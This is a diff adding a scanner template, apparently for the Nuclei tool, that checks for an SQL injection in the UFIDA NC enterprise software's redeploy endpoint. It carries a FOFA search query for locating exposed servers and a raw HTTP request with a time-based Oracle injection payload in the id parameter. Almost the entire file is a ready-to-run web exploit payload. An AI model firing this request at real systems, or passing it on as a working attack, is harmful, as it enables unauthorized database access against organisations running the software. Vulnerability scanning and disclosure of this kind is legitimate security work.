@@ -1,0 +1,33 @@
+id: poc-eg77mixaixglo7wg
+info:
+  name: 用友-UFIDA-NC redeploy存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/eg77mixaixglo7wg'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: eg77mixaixglo7wg
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - 'GET /portal/pt/M0dUlE/redeploy?id=1''AND+1=DBMS_PIPE.RECEIVE_MESSAGE(1,2)--&pageId=login HTTP/1.1
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+    Connection: close
+
+    Sleep: sleep'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
